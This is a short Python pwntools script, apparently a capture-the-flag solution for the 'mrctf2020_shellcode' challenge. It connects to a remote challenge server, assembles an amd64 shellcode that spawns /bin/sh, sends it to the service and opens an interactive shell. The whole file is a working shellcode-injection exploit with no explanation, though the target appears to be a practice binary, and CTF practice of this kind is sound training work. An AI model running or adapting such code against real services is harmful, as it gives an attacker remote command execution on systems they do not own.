from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# io = process('./mrctf2020_shellcode')
io = remote('node4.buuoj.cn',26060)
elf = ELF('./mrctf2020_shellcode')

shellcode = asm(shellcraft.amd64.sh())
print(len(shellcode))
io.send(shellcode)
io.interactive()